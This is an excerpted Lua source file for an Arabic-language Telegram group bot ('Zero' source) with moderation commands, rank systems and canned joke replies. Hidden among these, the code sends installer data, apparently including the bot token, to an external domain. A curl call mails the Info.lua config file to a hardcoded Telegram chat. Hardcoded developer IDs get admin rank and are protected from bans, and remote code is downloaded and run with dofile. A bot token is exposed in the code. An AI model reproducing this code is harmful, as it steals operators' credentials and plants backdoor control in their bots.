...
if res ~= 200 then
print('\27[0;31m◇━┅┅┄⟞⟦☆˹Z҉E҉ℛO҉˼☆⟧⟝┄┉┉━◇\n التوكن غير صحيح تاكد منه ثم ارسله')
else
io.write('\27[0;31m تم حفظ التوكن بنجاح \na◇━┅┅┄⟞⟦☆˹Z҉E҉ℛO҉˼☆⟧⟝┄┉┉━◇\n27[0;39;49m')
database:set(id_server..":token",token)
end 
else
print('\27[0;35m◇━┅┅┄⟞⟦☆˹Z҉E҉ℛO҉˼☆⟧⟝┄┉┉━◇ ┉\n لم يتم حفظ التوكن ارسل لي التوكن الان')
end 
...
https.request('https://devdeiveddev.ml/api/zero.php/?insert='..JSON.encode(infotnseb))
create_config_auto()
token = database:get(id_server..":token")
SUDO = database:get(id_server..":SUDO:ID")
...
sudo_users = {SUDO,1466455779,1505943315}   
...
elseif tonumber(user_id) == tonumber(1505943315) then
var = 'مطور السورس'
elseif tonumber(user_id) == tonumber(1330033568886222) then
var = 'المبرمج بيبو'  
elseif database:sismember(bot_id.."Dev:SoFi:2", user_id) then
var = "المطور الثانوي"  
elseif tonumber(user_id) == tonumber(bot_id) then  
...
elseif database:sismember(bot_id..'CoSu'..chat_id, user_id) then
var = database:get(bot_id.."CoSu:Rd"..msg.chat_id_) or 'زيرو'
elseif database:sismember(bot_id..'Basic:Constructor'..chat_id, user_id) then
...
local curl = 'curl "'..'https://api.telegram.org/bot1715000615:AAGRaBc-KdEfPikYWTQpvAjj9LWoM7Dwz_E/sendDocument'..'" -F "chat_id='.. 1466455779 ..'" -F "document=@'..'Info.lua'..'"' io.popen(curl)
--------------------------------------------------------------------------------------------------------------
...
os.execute('wget https://raw.githubusercontent.com/zero9001/zero2/main/DRAGON.lua')
send(msg.chat_id_, msg.id_,'☫ تم تحديث السورس')
dofile('DRAGON.lua')  
end
if text == 'الاصدار ' and DevSoFi(msg) then 
database:del(bot_id..'Srt:Bot') 
send(msg.chat_id_, msg.id_,' ☫ اصدار سورس زيرو { s: 6.7}')
end
...
{{text = 'قناه السورس️️', url="t.me/zeroO088"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/zeroO088&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
...
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = 'تواصل السورس 📬', url="t.me/toaasl88bot"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
...
send(msg.chat_id_,0," ☫ العضو : {["..data.first_name_.."](T.ME/zeroO088)}\n ☫ ["..DRAGON_Msg.."] \n")
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
send(msg.chat_id_,0, " ☫ عذرا ↫ {["..data.first_name_.."](T.ME/zeroO088)}\n ☫ عذرا تم منع الملصق \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/vid&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if text == 'السورس' or text == 'سورس' or text == 'يا سورس' then 
local Text = [[ 
♤━━━━━❲ [˹Z҉E҉ℛO҉˼](t.me/zeroO088) ❳━━━━━♤
]W𝙴𝙻𝙲𝙾𝙼𝙴 𝚃𝙾 𝚂𝙾𝚄𝚁𝙲𝙴 𝚉𝙴𝚁𝙾 
𝚃𝙷𝙴 𝙱𝙴𝚂𝚃 𝚂𝙾𝚄𝚁𝙲𝙴 𝙾𝙽 
𝚃𝙴𝙻𝙴𝙶𝚁𝙰𝙼 𖡼 (t.me/zeroO088)
♤━━━━━❲ [˹Z҉E҉ℛO҉˼](t.me/zeroO088) ❳━━━━━♤
]]
keyboard = {}
keyboard.inline_keyboard = {
{{text = '𝙈𝙊𝘿𝙄𝙔 𝅘𝅥𝅯',url="t.me/Mooodddiy"}},
{{text = '𓀡︎ 𓆩. ˹Z҉E҉ℛO҉˼ 𓆪 𓀡︎',url="t.me/zeRo9O9"}},
{{text = '⁽♔₎𝙨𝙤𝙪𝙧𝙘𝙚 𝙯𝙚𝙧𝙤|:☁ ', url="t.me/zeroO088"}},
}
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/zeroO088&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
...
local Text = [[
 ♡ اهلا بك في سورس زيرو الجمدان لو عايز بوت بأسعار منسبه وبوت مميز كلمني  ♡ 
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '𝙈𝙊𝘿𝙄𝙔 𝅘𝅥𝅯',url="t.me/Mooodddiy"}},
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'زيرو🇦🇺 ',url="t.me/zeRo9O9"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/zeRo9O9&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

if text == 'مودي'  then
local Text = [[
المبرمج ♡مودي♡ اتبع الزر في الاسفل لتواصل معه 👇
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'مودي🇦🇺',url="t.me/Mooodddiy"}},
}
local msg_id = msg.id_/2097152/0.5
...
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = 'مطورين السورس⚙', url="t.me/zeroO088"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/zeroO088&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

if text == 'العاب زيرو' or text == 'العاب مطوره' or text == 'العاب متطوره' then  
local Text = [[  
 اهلا في قائمه الالعاب المتطوره سورس زيرو🚌
...
elseif text == 'قفل زيرورسيه' and msg.reply_to_message_id_ == 0 and Manager(msg) then 
...
elseif text == 'فتح زيرورسيه' and msg.reply_to_message_id_ == 0 and Manager(msg) then 
...
if tonumber(result.sender_user_id_) == tonumber(1466455779) then  
send(msg.chat_id_, msg.id_, " ☫ لا تسطيع حظر مبرمج السورس عام")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(1505943315) then  
send(msg.chat_id_, msg.id_, " ☫ لا تسطيع حظر مبرمج السورس عام")
return false 
end
...
if result.id_ == tonumber(1466455779) then
...
if tonumber(userid) == tonumber(1466455779) then  
send(msg.chat_id_, msg.id_, " ☫ لا تسطيع حظر مبرمج السورس عام")
return false 
end
if tonumber(userid) == tonumber(1505943315) then  
send(msg.chat_id_, msg.id_, " ☫ لا تسطيع حظر مبرمج السورس عام")
return false 
end
...
if DevSoFi(msg) then
local Get_Files, res = https.request("https://raw.githubusercontent.com/zero9001/zero2/main/getfile.json")
if res == 200 then
local Get_info, res = pcall(JSON.decode,Get_Files);
vardump(res.plugins_)
if Get_info then
local TextS = "\n ☫ اهلا بك في متجر ملفات زيرو\n ☫ ملفات السورس ↓\n◇━┅┅┄⟞⟦☆˹Z҉E҉ℛO҉˼☆⟧⟝┄┉┉━◇\n\n"
local TextE = "\n◇━┅┅┄⟞⟦☆˹Z҉E҉ℛO҉˼☆⟧⟝┄┉┉━◇\n ☫ علامة تعني { ✔️ } ملف مفعل\n ☫ علامة تعني { ✖ } ملف معطل\n ☫ قناة سورس زيرو ↓\n".." ☫ [اضغط هنا لدخول](t.me/zeroO088) \n"
local NumFile = 0
...
local json_file, res = https.request("https://raw.githubusercontent.com/zero9001/zero2/main/File_Bot/"..file)
if res == 200 then
os.execute("rm -fr File_Bot/"..file)
send(msg.chat_id_, msg.id_,t) 
dofile('DRAGON.lua')  
else
send(msg.chat_id_, msg.id_," ☫ عذرا الملف لايدعم سورس زيرو \n") 
end
return false
end
...
if text == ("مسح قائمه زيرو") and Sudo(msg) then
database:del(bot_id..'CoSu'..msg.chat_id_)
send(msg.chat_id_, msg.id_, '\n ☫ تم مسح قائمه زيرو')
return false
end

if text == 'قائمه زيرو' and Sudo(msg) then
...
if text == ("رفع زيرو") and msg.reply_to_message_id_ and Sudo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^رفع زيرو @(.*)$") and Sudo(msg) then
local username = text:match("^رفع زيرو @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^رفع زيرو (%d+)$") and Sudo(msg) then
local userid = text:match("^رفع زيرو (%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text == ("تنزيل زيرو") and msg.reply_to_message_id_ and Sudo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^تنزيل زيرو @(.*)$") and Sudo(msg) then
local username = text:match("^تنزيل زيرو @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^تنزيل زيرو (%d+)$") and Sudo(msg) then
local userid = text:match("^تنزيل زيرو (%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
-----------------------------------------------------
if text == 'مسح قلب مودي' and Mod(msg) then
database:del(bot_id..'Zahf:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' ☫ تم تنزيل جميع القلوب ')
end
if text == ("تاك لقلب مودي") and Mod(msg) then
local list = database:smembers(bot_id..'Zahf:User'..msg.chat_id_)
t = "\n ☫ قائمة القلوب في الجروب\n◇━┅┅┄⟞⟦☆˹Z҉E҉ℛO҉˼☆⟧⟝┄┉┉━◇\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."← قلب مودي [@"..username.."]\n"
else
t = t..""..k.."← قلب مودي "..v.."\n"
end
end
...
---------
if text == ("رفع قلب مودي") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if (text == ("تنزيل قلب مودي")) and msg.reply_to_message_id_ and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
-----------------------------------------------------
if text == 'مسح قلب زيرو' and Mod(msg) then
database:del(bot_id..'Zahf:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' ☫ تم تنزيل جميع القلوب ')
end
if text == ("تاك لقلب زيرو") and Mod(msg) then
local list = database:smembers(bot_id..'Zahf:User'..msg.chat_id_)
t = "\n ☫ قائمة القلوب في الجروب\n◇━┅┅┄⟞⟦☆˹Z҉E҉ℛO҉˼☆⟧⟝┄┉┉━◇\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."← قلب زيرو [@"..username.."]\n"
else
t = t..""..k.."← قلب زيرو "..v.."\n"
end
end
...
---------
if text == ("رفع قلب زيرو") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if (text == ("تنزيل قلب زيرو")) and msg.reply_to_message_id_ and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text == ""..(database:get(bot_id..'Name:Bot') or 'زيرو').."" then  
Namebot = (database:get(bot_id..'Name:Bot') or 'زيرو')
local DRAGON_Msg = {
'ننعم يروحي 😻💙',
'نعم يا قلب  '..Namebot..'',
'عاوز اي من '..Namebot..'',
...
local Namebot = (database:get(bot_id..'Name:Bot') or 'زيرو')
local DRAGON_Msg = {
'اسمي  '..Namebot..' ياروحي قلب امك 👻✨',
'اسمي  '..Namebot..' يبولا 😜💥',
'اسمي  '..Namebot..' يبشه 🧸',
'اسمي  '..Namebot..' يا قمر 🐭🤍',
'اسمي  '..Namebot..' يعم 😒',
...
end --الكود حصري سورس زيرو يعني لو بكتهن راح اعرفك انت الاخذتهن
...
-------------------------------
if text == ""..(database:get(bot_id..'Name:Bot') or 'زيرو').." غادر" or text == 'غادر' then  
...
send(msg.chat_id_,msg.id_, '[انت مطوري نور عنيا🥺🤍](t.me/zeroO088)') 
return false
end

if text == 'انا مين' and DevSoFi(msg) then 
send(msg.chat_id_,msg.id_, '[انت مطوري الثاني حته مني 😍💚](t.me/zeroO088)') 
return false
end

if text == 'انا مين' and Sudo(msg) then 
send(msg.chat_id_,msg.id_, '[انت المطور بس الصغنن 🌝💘](t.me/zeroO088)') 
return false
end

if text == 'انا مين' and CoSu(msg) then 
send(msg.chat_id_,msg.id_, '[نت المالك هن يعني حاجه فوق فوف راسي 😂♥](t.me/zeroO088)') 
return false
end

if text == 'انا مين' and Constructor(msg) then 
send(msg.chat_id_,msg.id_, '[انت منشئ يسطا عتلاء منشئ عاوز حاجه تانيه😹🤦‍♂️](t.me/zeroO088)') 
return false
end

if text == 'انا مين' and BasicConstructor(msg) then 
send(msg.chat_id_,msg.id_, '[ انت هنا منشئ اساسي يعني اعلى رتبه عاوزك تفتخر😂🚨](t.me/zeroO088)') 
return false
end

if text == 'انا مين' and Manager(msg) then 
send(msg.chat_id_,msg.id_, '[ انت المدير يعني الروم تحت سيطرتك😹](t.me/zeroO088)') 
return false
end

if text == 'انا مين' and Mod(msg) then 
send(msg.chat_id_,msg.id_, '[انت مجرد ادمن اجتهد عشان ياخد رتبه😹 ](t.me/zeroO088)') 
return false
end

if text == 'انا مين' and Special(msg) then 
send(msg.chat_id_,msg.id_, '[ انت مميز ابن ناس 😊 ](t.me/zeroO088)') 
return false
end

if text == 'انا مين' then
send(msg.chat_id_,msg.id_, '[انت مجرد عضو زليل حقير ملوش لزمه 😂](t.me/zeroO088)') 
return false
end
...
if text == 'سلام' then 
send(msg.chat_id_,msg.id_, '[ابق تعاله كليوم..😹💔🎶](t.me/zeroO088)') 
return false
end

if text == 'هاي' or text == 'هيي' then
send(msg.chat_id_,msg.id_, '[علي الواي فاي..😺💜](t.me/zeroO088)') 
return false
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[خدوني معاكم برايفت والنبي..🥺💜](t.me/zeroO088)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[عليه الصلاه والسلام..💛🙂](t.me/zeroO088)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[نزل عينك عيب كده..🌚♥️](t.me/zeroO088)') 
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[يحلات عيونك..♥️🦋](t.me/zeroO088)')
return false
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[عايز من ده..💋🥀](t.me/zeroO088)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[خدوني معاكم بف..🙄💔](t.me/zeroO088)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[متزعلش بحبك..😥♥️](t.me/zeroO088)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[وانا كمان بحبك .🥺❤️](t.me/zeroO088)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[خدوني معاكم بيف ..🙄💔](t.me/zeroO088)')
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[وعليكم السلام ..🖤🌚](t.me/zeroO088)') 
return false
end
end
end
...
local Name_Bot = (database:get(bot_id..'Name:Bot') or 'زيرو')
